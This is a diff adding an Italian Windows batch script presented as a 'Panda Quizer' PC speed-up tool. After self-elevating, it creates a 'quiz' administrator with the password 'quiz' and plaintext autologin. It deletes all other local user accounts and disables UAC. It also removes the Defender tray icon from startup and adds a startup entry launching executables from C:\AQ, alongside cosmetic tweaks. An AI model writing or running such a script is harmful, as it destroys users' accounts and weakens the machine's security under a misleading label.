@@ -1,0 +1,1494 @@
+@echo off
+:: Colore iniziale
+color 0b
+:: Abilita Unicode
+chcp 65001 >nul
+echo.
+echo.
+echo.
+echo                          466664                        
+echo                        449365696                       
+echo                      4496694965996                     
+echo                    44666652699955996                   
+echo                  446696969884699944996                 
+echo                 469496996232268698959899               
+echo               4665664495444624598698969999             
+echo             46466956654460008644599988999899           
+echo           46994652854460008888865649964988989          
+echo         449969966540000088899988864469669889899        
+echo       4499666662580888999945899998946469999888889      
+echo     64666669946549889955555444448888946699699898988    
+echo   646646969662948006455498008866669888949499889869889  
+echo   46949669945628008886560000088086980888895968688986888 
+echo  6966696969246008886644000888888899988888886998898426988
+echo  6998869659549088896944008888888999980888896980898969988
+echo  699698999894658899989698888999999980088949880988986800 
+echo   69969899884664999666669899999998880869990846899800   
+echo     9996989988664698809999999999000096880880889900     
+echo       9988999888666688880089800800998800808889000      
+echo         998866988846698800800000068800808988800        
+echo           98999968886949888888869880808898800          
+echo            99899999889666988969880800899800            
+echo              8888999988869999980800899800              
+echo                888999968888800800889800                
+echo                  88888899999888899800                  
+echo                    88889988989468000                   
+echo                      8888880898000                     
+echo                        888864000                       
+echo                         888888           
+echo.
+echo.
+echo.
+echo Il presente script .bat è protetto dalle normative vigenti in materia di diritto d'autore e di proprietà intellettuale.
+echo Per tanto è espressamente vietato attribuirsi la paternità del presente software senza il consenso scritto del legittimo autore.
+echo L'utilizzo del programma per finalità commerciali è consentito unicamente previa autorizzazione esplicita da parte dell'autore.
+echo Il software è fornito esclusivamente per uso privato e personale.
+echo L'autore non si assume alcuna responsabilità per eventuali danni a software/hardware derivante dall'uso dello script.
+echo Il codice sorgente è aperto e liberamente modificabile nel rispetto delle condizioni sopra indicate.
+echo.
+echo.
+echo           © Copyright Michele Caiazzo
+echo.
+echo.
+echo.
+echo Premi un qualsiasi tasto per continuare...
+pause>nul
+
+cls
+:: Colore figo
+color 0c
+title Panda Quizer software
+echo.
+echo.
+echo.
+echo  ___________________
+echo  ^| _______________ ^|
+echo  ^| ^|XXXXXXXXXXXXX^| ^|
+echo  ^| ^|XXXXXXXXXXXXX^| ^|
+echo  ^| ^|XXXXXXXXXXXXX^| ^|
+echo  ^| ^|XXXXXXXXXXXXX^| ^|
+echo  ^| ^|XXXXXXXXXXXXX^| ^|
+echo  ^|_________________^|
+echo      _[_______]_
+echo  ___[___________]^___
+echo ^|         [_____] []^|__
+echo ^|         [_____] []^|  \__
+echo L___________________J     \ \___\/
+echo  ___________________      /\
+echo /###################\    (__)
+echo.
+echo.
+echo.
+echo Se premi un tasto viene avviato il sistema per velocizzare il PC disattivando servizi non essenziali, ma anche quelli che potrebbero servire, inoltre viene eseguita una modifica radicale e ottimizzata del sistema cambiando molti parametri di configurazione, non mi assumo nessuna responsabilita per eventuali danni!
+pause>nul
+echo.
+color 06
+setlocal enabledelayedexpansion
+
+:: === Elevazione dei privilegi (compatibile anche senza PowerShell) ===
+fltmc >nul 2>&1 || (
+    echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "%~s0", "", "", "runas", 1 > "%temp%\getadmin.vbs"
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /b
+)
+
+echo Utente corrente: %USERNAME%
+
+:: Se utente NON è quiz, crea account, imposta autologin e fa logout
+if /i not "%USERNAME%"=="quiz" (
+    echo Utente diverso da quiz, creo account quiz e imposto autologin...
+    net user quiz quiz /add
+    net localgroup Administrators quiz /add
+
+    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
+    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d quiz /f
+    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d quiz /f
+
+    echo Logout in corso per applicare le modifiche...
+    timeout /t 3 /nobreak >nul
+    shutdown /l
+    exit /b
+)
+
+echo Eseguo eliminazione utenti non autorizzati...
+
+for /f "skip=1 tokens=1" %%a in ('net user') do (
+    set "user=%%a"
+    if not "!user!"=="" (
+        if /i not "!user!"=="quiz" (
+            if /i not "!user!"=="Administrator" (
+                if /i not "!user!"=="Guest" (
+                    if /i not "!user!"=="DefaultAccount" (
+                        echo Eliminazione utente: !user!
+                        net user "!user!" /delete
+                    )
+                )
+            )
+        )
+    )
+)
+
+
+:: Ottieni il nome dell'utente attualmente loggato
+for /f "tokens=2 delims=\" %%A in ("%USERDOMAIN%\%USERNAME%") do set CURRENT_USER=%%A
+
+:: Stampa l'utente corrente
+echo Utente corrente: %CURRENT_USER%
+
+:: Elenca tutti gli utenti locali
+for /f "skip=1 tokens=1*" %%A in ('wmic useraccount where "localaccount='true'" get name ^| findstr /r /v "^$"') do (
+    set USER=%%A
+    if /i not "!USER!"=="%CURRENT_USER%" (
+        echo Eliminazione utente: !USER!
+        net user "!USER!" /delete
+    )
+)
+
+echo Operazione completata.
+
+echo Utenti non autorizzati eliminati.
+
+echo.
+
+REM Modifica immagine profilo automatica
+set "b64=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"
+
+REM Percorso file base64 temporaneo
+set "base64file=%temp%\image.b64"
+
+REM Percorso immagine output (profile picture)
+set "imgpath=%AppData%\Microsoft\Windows\AccountPictures\profile.png"
+
+REM Scrivo la base64 in un file senza andare a capo (solo la stringa)
+> "%base64file%" echo !b64!
+
+REM Decodifico base64 in PNG
+certutil -decode "%base64file%" "%imgpath%"
+
+if errorlevel 1 (
+  echo Errore durante la decodifica base64!
+  goto end
+)
+
+echo Immagine profilo salvata in: %imgpath%
+echo Per applicare l'immagine profilo potrebbe essere necessario logout o riavvio.
+
+:end
+
+echo [*] Applico modifiche al sistema...
+
+echo.
+
+REM Disabilita tutti gli effetti visivi per massima velocità
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v VisualFXSetting /t REG_DWORD /d 2 /f
+reg add "HKCU\Control Panel\Desktop" /v UserPreferencesMask /t REG_BINARY /d 9012038010000000 /f
+reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v MinAnimate /t REG_SZ /d 0 /f
+
+REM Ottimizzazioni registro per velocità estrema
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v SystemResponsiveness /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v NetworkThrottlingIndex /t REG_DWORD /d 4294967295 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v Win32PrioritySeparation /t REG_DWORD /d 38 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v LargeSystemCache /t REG_DWORD /d 1 /f
+
+
+REM Imposta le chiavi di registro per abilitare il contrasto elevato
+::echo Attivazione del contrasto elevato...
+::reg add "HKCU\Control Panel\Accessibility\HighContrast" /v Flags /t REG_SZ /d 1 /f
+::reg add "HKCU\Control Panel\Accessibility\HighContrast" /v High Contrast Scheme /t REG_SZ /d "High Contrast Black" /f
+::echo Tweak del registro applicato. Provo ad attivare il contrasto...
+
+
+echo Attivo il tema scuro di Windows...
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v AppsUseLightTheme /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v SystemUsesLightTheme /t REG_DWORD /d 0 /f
+
+echo Tema scuro attivato nel registro.
+
+
+
+REM Prima opzione: percorso standard della cartella Esecuzione Automatica
+set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+REM Se non esiste, prova percorso alternativo basato su %USERPROFILE%
+if not exist "%startup_folder%" (
+    set "startup_folder=%USERPROFILE%\Start Menu\Programs\Startup"
+)
+
+REM Verifica se la cartella esiste ora
+if not exist "%startup_folder%" (
+    echo ERRORE: Cartella Esecuzione Automatica non trovata.
+    pause
+    exit /b 1
+)
+
+REM Crea lo script autowquiz.bat dentro Startup
+set "target=%startup_folder%\autowquiz.bat"
+
+(
+    echo @echo off
+    echo start /REALTIME C:\AQ\wquiz.exe
+    echo start /HIGH C:\AQ\supdate.exe
+) > "%target%"
+
+echo File creato con successo: "%target%"
+
+
+
+
+
+:: Disattiva completamente UAC - Richiede esecuzione come Amministratore
+echo Disattivazione del Controllo Account Utente (UAC)...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
+
+echo.
+
+REM Impostazioni aggressive per la memoria virtuale
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v DisablePagingExecutive /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 0 /f
+
+
+::Togliere notifica di Defender dall'avvio automatico
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SecurityHealth /f
+echo Rimosso SecurityHealthSystray.exe dall'avvio automatico.
+echo.
+
+REM Mostra Computer
+::reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /t REG_DWORD /d 0 /f
+::reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /t REG_DWORD /d 0 /f
+
+REM Mostra Rete
+::reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{59031A47-3F72-44A7-89C5-5595FE6B30EE}" /t REG_DWORD /d 0 /f
+::reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{59031A47-3F72-44A7-89C5-5595FE6B30EE}" /t REG_DWORD /d 0 /f
+
+REM Mostra Cartella utente
+::reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{21EC2020-3AEA-1069-A2DD-08002B30309D}" /t REG_DWORD /d 0 /f
+::reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{21EC2020-3AEA-1069-A2DD-08002B30309D}" /t REG_DWORD /d 0 /f
+
+REM Mostra Pannello di controllo (GUID nuova per Windows 10+)
+::reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}" /t REG_DWORD /d 0 /f
+::reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}" /t REG_DWORD /d 0 /f
+
+REM Mostra Pannello di controllo (GUID vecchia per compatibilità)
+::reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}" /t REG_DWORD /d 0 /f
+::reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}" /t REG_DWORD /d 0 /f
+
+
+REM Nascondere Computer/Questo PC
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /t REG_DWORD /d 1 /f 2>&1
+
+REM Nascondere Cestino
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{645FF040-5081-101B-9F08-00AA002F954E}" /t REG_DWORD /d 1 /f 2>&1
+
+REM Nascondere Cartella Utente
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{59031a47-3f72-44a7-89c5-5595fe6b30ee}" /t REG_DWORD /d 1 /f 2>&1
+
+REM Nascondere Rete
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}" /t REG_DWORD /d 1 /f 2>&1
+
+REM Nascondere Pannello di Controllo
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}" /t REG_DWORD /d 1 /f 2>&1
+
+REM Per versioni precedenti di Windows (Desktop classico)
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /t REG_DWORD /d 1 /f 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{645FF040-5081-101B-9F08-00AA002F954E}" /t REG_DWORD /d 1 /f 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{59031a47-3f72-44a7-89c5-5595fe6b30ee}" /t REG_DWORD /d 1 /f 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}" /t REG_DWORD /d 1 /f 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}" /t REG_DWORD /d 1 /f 2>&1
+
+echo Icone nascoste con successo!
+
+:: Abilita autohide taskbar in modalità desktop
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v TaskbarAutoHide /t REG_DWORD /d 1 /f
+
+:: Abilita autohide taskbar in modalità tablet
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v TaskbarAutoHideInTabletMode /t REG_DWORD /d 1 /f
+
+:: Usa icone piccole nella taskbar
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v TaskbarSmallIcons /t REG_DWORD /d 1 /f
+
+::Imposta lo zoom schermo
+echo Impostando zoom schermo al 125%...
+
+echo Modificando impostazioni DPI...
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "Win8DpiScaling" /t REG_DWORD /d 1 /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "LogPixels" /t REG_DWORD /d 120 /f
+
+echo Impostando scaling a 125%...
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics" /v "AppliedDPI" /t REG_DWORD /d 120 /f
+
+echo Configurando zoom display...
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\DWM" /v "UseDpiScaling" /t REG_DWORD /d 1 /f
+
+echo Applicando modifiche al sistema...
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\FontDPI" /v "LogPixels" /t REG_DWORD /d 120 /f
+
+echo Forzando aggiornamento DPI...
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "DesktopDPIOverride" /t REG_DWORD /d 120 /f
+
+echo Impostando compatibilita alta DPI...
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "HIGHDPIAWARE" /t REG_DWORD /d 1 /f
+
+
+
+REM Abilita ombra al puntatore
+echo Abilitazione ombra puntatore...
+reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v "MouseShadow" /t REG_SZ /d "1" /f 2>&1
+
+REM Imposta schema puntatore Windows Invertito (molto grandi)
+echo Impostazione schema puntatore Windows Invertito (molto grandi)...
+
+REM Percorsi dei cursori Windows Invertito molto grandi
+set "cursor_path=%SystemRoot%\cursors\"
+
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "AppStarting" /t REG_EXPAND_SZ /d "%cursor_path%wait_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "Arrow" /t REG_EXPAND_SZ /d "%cursor_path%arrow_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "Crosshair" /t REG_EXPAND_SZ /d "%cursor_path%cross_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "Hand" /t REG_EXPAND_SZ /d "%cursor_path%handwriting_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "Help" /t REG_EXPAND_SZ /d "%cursor_path%help_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "IBeam" /t REG_EXPAND_SZ /d "%cursor_path%beam_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "No" /t REG_EXPAND_SZ /d "%cursor_path%no_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "NWPen" /t REG_EXPAND_SZ /d "%cursor_path%pen_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "SizeAll" /t REG_EXPAND_SZ /d "%cursor_path%move_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "SizeNESW" /t REG_EXPAND_SZ /d "%cursor_path%size1_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "SizeNS" /t REG_EXPAND_SZ /d "%cursor_path%size4_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "SizeNWSE" /t REG_EXPAND_SZ /d "%cursor_path%size2_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "SizeWE" /t REG_EXPAND_SZ /d "%cursor_path%size3_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "UpArrow" /t REG_EXPAND_SZ /d "%cursor_path%up_il.cur" /f 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "Wait" /t REG_EXPAND_SZ /d "%cursor_path%busy_il.cur" /f 2>&1
+
+REM Imposta il nome dello schema
+reg add "HKEY_CURRENT_USER\Control Panel\Cursors" /v "" /t REG_SZ /d "Windows Invertito (molto grandi)" /f 2>&1
+
+REM Abilita visualizzazione posizione puntatore con CTRL
+echo Abilitazione visualizzazione posizione con tasto CTRL...
+reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v "Sonar" /t REG_SZ /d "1" /f 2>&1
+
+REM Rimozione sfondo
+echo Rimozione sfondo desktop corrente...
+reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v "Wallpaper" /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "Wallpaper" /t REG_SZ /d "" /f
+
+echo Impostazione colore sfondo a grigio scuro...
+reg add "HKEY_CURRENT_USER\Control Panel\Colors" /v "Background" /t REG_SZ /d "64 64 64" /f
+
+echo Disattivazione presentazione sfondi...
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "WallpaperStyle" /t REG_SZ /d "0" /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "TileWallpaper" /t REG_SZ /d "0" /f
+
+
+echo Aggiornamento impostazioni desktop...
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+REM Nascondi barra
+
